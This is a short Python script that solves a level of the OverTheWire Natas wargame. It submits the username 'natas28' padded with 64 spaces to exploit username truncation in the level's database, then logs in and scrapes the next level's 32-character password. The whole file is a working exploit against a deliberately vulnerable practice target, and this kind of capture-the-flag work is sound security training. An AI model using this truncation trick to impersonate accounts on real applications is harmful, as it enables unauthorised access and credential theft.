import config
import os, re, base64
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

params = {
	"username" : "natas28" + " " * 64 + "x",
	"password" : "password"
}

response = get(url, auth=(user, password), params=params)

params["username"] = "natas28"
response = get(url, auth=(user, password), params=params)

password = re.findall(r"\w{32}", response.content)[-1]

print(password)